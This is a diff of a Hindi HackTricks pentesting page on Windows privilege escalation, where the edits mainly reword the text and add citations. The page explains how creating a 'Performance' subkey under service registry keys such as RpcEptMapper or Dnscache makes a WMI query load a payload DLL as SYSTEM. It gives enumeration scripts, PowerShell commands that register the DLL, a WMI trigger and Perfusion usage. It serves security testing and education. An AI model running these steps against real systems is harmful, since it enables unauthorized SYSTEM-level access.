@@ -1,20 +1,20 @@
-# AppendData/AddSubdirectory Permission over Service Registry
+# Service Registry पर AppendData/AddSubdirectory Permission
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
+**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>
 
 ## Summary
 
-अगर आपके पास किसी service registry key पर सिर्फ **`Create Subkey`** / **`AppendData/AddSubdirectory`** है, तब भी यह एक अच्छा privesc lead है। आम तौर पर आप सीधे **`ImagePath`**, **`ServiceDll`**, या अन्य मौजूदा values को overwrite नहीं कर सकते, लेकिन आप फिर भी इनके नीचे एक **`Performance`** child key बना सकते हैं:
+यदि आपके पास किसी service registry key पर केवल **`Create Subkey`** / **`AppendData/AddSubdirectory`** permissions हैं, तो भी यह privesc के लिए एक अच्छा lead है। आमतौर पर आप `ImagePath`, `ServiceDll` या अन्य मौजूदा values को सीधे **overwrite** नहीं कर सकते, लेकिन फिर भी आप इनके अंतर्गत एक **`Performance`** child key बना सकते हैं:
 
 - **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
 - **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
-- कोई भी अन्य **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key जहाँ आपके token के पास **`KEY_CREATE_SUB_KEY`** हो
+- कोई भी अन्य **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key, जहाँ आपके token के पास **`KEY_CREATE_SUB_KEY`** हो
 
-Trick यह है कि Windows अभी भी legacy **PerfLib V1** registration model को support करता है। अगर किसी service के पास **`Performance`** subkey है, तो जब कोई performance counter consumer data request करता है, Windows वहाँ से एक DLL load कर सकता है।
+यह तरकीब इस तथ्य पर आधारित है कि Windows अभी भी legacy **PerfLib V1** registration model को support करता है। यदि किसी service में **`Performance`** subkey है, तो जब कोई performance counter consumer data का अनुरोध करता है, Windows वहाँ से एक DLL load कर सकता है।
 
-Microsoft documentation के अनुसार, minimum registration है:
+Microsoft documentation के अनुसार, minimum registration यह है:<sup>[[1]](#references)</sup>
 ```text
 HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
 Library = C:\Path\payload.dll
@@ -22,20 +22,20 @@ Open    = OpenPerfData
 Collect = CollectPerfData
 Close   = ClosePerfData
 ```
-तो offensive takeaway यह है: **सिर्फ इसलिए किसी service registry finding को discard मत करो क्योंकि तुम्हें `SetValue` की बजाय सिर्फ `CreateSubKey` मिला**।
+इसलिए offensive takeaway है: **किसी service registry finding को केवल इसलिए discard न करें क्योंकि आपको `SetValue` के बजाय सिर्फ `CreateSubKey` मिला है**।<sup>[[3]](#references)</sup>
 
-## यह code execution के लिए क्यों काफी है
+## यह code execution के लिए पर्याप्त क्यों है
 
-`Performance` subkey आमतौर पर इन services पर by default मौजूद नहीं होता, इसलिए **`KEY_CREATE_SUB_KEY`** वही primitive है जिसकी तुम्हें ज़रूरत है। एक बार key बन जाए और उसमें `Library`/`Open`/`Collect`/`Close` मौजूद हों, तो कोई भी **performance counter consumer** DLL load trigger कर सकता है।
+इन services पर `Performance` subkey आमतौर पर default रूप से मौजूद **नहीं** होती, इसलिए आपको **`KEY_CREATE_SUB_KEY`** primitive की आवश्यकता होती है। एक बार key मौजूद हो जाए और उसमें `Library`/`Open`/`Collect`/`Close` मौजूद हों, तो कोई भी **performance counter consumer** DLL load को trigger कर सकता है।<sup>[[3]](#references)</sup>
 
-कुछ महत्वपूर्ण details:
+कुछ महत्वपूर्ण विवरण:
 
-- **`Library`** value एक **full DLL path** की ओर point कर सकती है।
-- DLL को **`OpenPerfData`**, **`CollectPerfData`**, और **`ClosePerfData`** export करना चाहिए और `ERROR_SUCCESS` return करना चाहिए।
-- Code **consumer's context** में run होता है, **ज़रूरी नहीं कि vulnerable service process itself** में।
-- Classic `RpcEptMapper` / `Dnscache` case में, एक **WMI performance query** **`wmiprvse.exe`** से DLL को **`NT AUTHORITY\SYSTEM`** के रूप में load करा सकती है।
+- **`Library`** value किसी **पूर्ण DLL path** की ओर point कर सकती है।
+- DLL को **`OpenPerfData`**, **`CollectPerfData`**, और **`ClosePerfData`** export करने होंगे और `ERROR_SUCCESS` return करना होगा।
+- Code **consumer के context** में चलता है, **जरूरी नहीं कि vulnerable service process में ही**।
+- Classic `RpcEptMapper` / `Dnscache` case में, एक **WMI performance query** **`wmiprvse.exe`** से DLL को **`NT AUTHORITY\SYSTEM`** के रूप में load करवा सकती है।
 
-इसी वजह से triage के दौरान यह primitive आसानी से miss हो जाता है: parent service key "fully writable" नहीं है, लेकिन फिर भी weaponizable है।
+इसी कारण triage के दौरान यह primitive आसानी से छूट जाती है: parent service key "पूरी तरह writable" नहीं होती, लेकिन फिर भी इसका weaponization किया जा सकता है।
 
 ## Quick enumeration
 
@@ -44,7 +44,7 @@ Close   = ClosePerfData
 accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
 accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
 ```
-सर्विस keys पर **`CreateSubKey`** वाले low-privileged principals को खोजने के लिए PowerShell example:
+service keys पर **`CreateSubKey`** वाले low-privileged principals को खोजने का PowerShell example:
 ```powershell
 Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
 $weak = (Get-Acl $_.PSPath).Access | Where-Object {
@@ -59,13 +59,13 @@ if ($weak) {
 ```
 उपयोगी tooling:
 
-- **PrivescCheck**: `Get-ModifiableRegistryPath` को खास तौर पर इस class of issue को spot करने के लिए बनाया गया था।
+- **PrivescCheck**: `Get-ModifiableRegistryPath` विशेष रूप से इस प्रकार की समस्या पहचानने के लिए बनाया गया था।<sup>[[3]](#references)</sup>
 - **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
-- **Perfusion**: legacy vulnerable targets पर DLL drop, `Performance` registration, WMI trigger, token duplication, और cleanup को automate करता है (उदाहरण के लिए: `Perfusion.exe -c cmd -i -k Dnscache`).
+- **Perfusion**: legacy vulnerable targets पर DLL drop, `Performance` registration, WMI trigger, token duplication और cleanup को automate करता है (उदाहरण के लिए: `Perfusion.exe -c cmd -i -k Dnscache`)।<sup>[[4]](#references)</sup>
 
 ## Abuse flow
 
-`Performance` subkey बनाएं और required values populate करें:
+`Performance` subkey बनाएं और आवश्यक values भरें:<sup>[[3]](#references)</sup>
 ```powershell
 $svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
 $k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
@@ -75,32 +75,35 @@ New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force
 New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
 New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
 ```
-फिर एक **privileged** performance consumer trigger करें। एक classic example `Win32_Perf*` classes पर WMI query है:
+इसके बाद एक **privileged** performance consumer को trigger करें। `Win32_Perf*` classes पर WMI query इसका एक classic example है:<sup>[[3]](#references)</sup>
 ```powershell
 powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
 ```
-परिचालन नोट्स:
+ऑपरेशनल नोट्स:
 
-- **`perfmon.exe`** लॉन्च करना यह सत्यापित करने के लिए उपयोगी है कि counter registration सही है, लेकिन यह आमतौर पर DLL को केवल **आपके अपने user context** में ही load करता है।
-- वास्तविक LPE के लिए, **WMI** जैसे किसी **privileged** consumer को trigger करें।
-- अगर आप अपना exploit लिख रहे हैं, तो DLL के अंदर से सीधे `cmd.exe` spawn करने पर आमतौर पर आपको **session 0** में shell मिलता है। `Perfusion` इसे attacker's session में suspended बनाई गई process में privileged token को duplicate करके solve करता है।
-- DLL architecture को target consumer से match करें (**x64 on x64 systems**).
+- **`perfmon.exe`** लॉन्च करना यह सत्यापित करने के लिए उपयोगी है कि counter registration सही है, लेकिन इससे आमतौर पर DLL केवल **आपके अपने user context** में load होती है।
+- वास्तविक LPE के लिए **privileged** consumer, जैसे **WMI**, को trigger करें।
+- यदि आप अपना exploit लिख रहे हैं, तो DLL के अंदर से सीधे `cmd.exe` spawn करने पर आमतौर पर आपको **session 0** में shell मिलता है। `Perfusion` privileged token को attacker के session में suspended अवस्था में बनाए गए process में duplicate करके इस समस्या को हल करता है।<sup>[[4]](#references)</sup>
+- DLL architecture को target consumer से match करें (**x64 on x64 systems**)।
 
-## Version notes / recent developments
+## Version notes / हाल के developments
 
-Historically, built-in weak keys थे:
+Historically, built-in weak keys ये थीं:<sup>[[4]](#references)</sup>
 
 - **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` और `Dnscache`
 - **Windows 8 / Windows Server 2012**: `RpcEptMapper`
 
-`Perfusion` नोट करता है कि **April 2021** updates ने updated **Windows 8 / Windows Server 2012** पर आसान exploitation path को हटा दिया, जबकि **Windows 7 / Windows Server 2008 R2** अभी भी **`Dnscache`** के माध्यम से exploitable रहा।
+`Perfusion` के अनुसार, **April 2021** updates ने updated **Windows 8 / Windows Server 2012** पर आसान exploitation path हटा दिया, जबकि **Windows 7 / Windows Server 2008 R2** में **`Dnscache`** के माध्यम से exploitation संभव रहा।<sup>[[4]](#references)</sup>
 
-यह primitive केवल historical नहीं है। **January 2025** में, Microsoft ने एक related AD DS issue patch किया जहाँ **`Network Configuration Operators`** के members **`Dnscache`** और **`NetBT`** के तहत subkeys create कर सकते थे, और वही **Performance-counter DLL registration** idea supported systems पर **SYSTEM** तक पहुँचने के लिए reuse किया जा सकता था।
+यह primitive **केवल historical नहीं है**। **January 2025** में Microsoft ने एक संबंधित AD DS issue को patch किया, जिसमें **`Network Configuration Operators`** के members **`Dnscache`** और **`NetBT`** के अंतर्गत subkeys बना सकते थे, और supported systems पर **SYSTEM** तक पहुंचने के लिए उसी **Performance-counter DLL registration** idea का दोबारा उपयोग किया जा सकता था।<sup>[[2]](#references)</sup>
 
-इसलिए modern lesson generic है: जब भी किसी low-privileged principal के पास **`CreateSubKey`** on **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** हो, finding को dismiss करने से पहले जाँचें कि क्या **`Performance`** child key पर्याप्त है।
+इसलिए modern lesson generic है: जब भी किसी low-privileged principal के पास **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** पर **`CreateSubKey`** हो, तो finding को dismiss करने से पहले जांचें कि क्या **`Performance`** child key पर्याप्त है।
 
 ## References
 
-- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
-- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
+- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
+- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
+- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
+- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)
+
 {{#include ../../banners/hacktricks-training.md}}
